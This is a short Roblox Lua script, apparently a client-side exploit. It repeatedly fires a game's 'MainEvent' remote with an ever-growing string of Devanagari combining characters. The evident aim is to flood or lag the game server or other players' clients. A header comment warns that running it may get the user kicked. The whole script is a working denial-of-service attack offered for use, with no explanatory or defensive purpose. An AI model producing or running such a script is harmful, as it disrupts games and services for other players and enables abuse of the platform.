-- WARNING: Has a chance of kicking you

local Event = game:GetService("ReplicatedStorage").MainEvent
local plr = game:GetService("Players").LocalPlayer

local str = "र्क्ष्यु"

while true do
	if not plr.Character or not Event then break end
	for i=0, 999 do
		Event:FireServer(
    		"RP",
    		str
		)
		str = str .. "र्क्ष्यु"
		task.wait()
	end
	str = "र्क्ष्यु"
	task.wait()
end
